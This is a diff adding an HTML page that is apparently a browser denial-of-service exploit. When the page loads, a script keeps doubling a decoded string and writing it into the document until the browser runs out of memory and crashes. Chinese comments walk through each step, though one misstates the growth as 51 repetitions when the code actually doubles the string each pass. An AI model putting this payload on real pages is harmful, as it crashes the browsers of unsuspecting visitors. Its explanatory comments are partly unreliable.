@@ -1,0 +1,22 @@
+<html>
+<head>
+  <title>"throw exception" Remote Crash and Denial of Service</title>
+</head>
+<script>
+  function tor() {
+    // 创建一个初始的 URI 字符串，内容为 '%u4141%u4141'，它在 JavaScript 中被解码为十六进制数值 0x4141 (即 'AA')
+    var uristring = unescape("%u4141%u4141");
+
+    // 使用循环，将 uristring 字符串自身重复 51 次（初始加上循环中的 50 次）
+    for (i = 0; i <= 50; ++i) {
+      uristring += uristring;
+      // 每次循环都会将重复的 uristring 写入到 HTML 文档中
+      document.write(uristring);
+    }
+
+    // 最后再写入一次最终的 uristring
+    document.write(uristring);
+  }
+</script>
+<body onload="tor()"></body>
+</html>
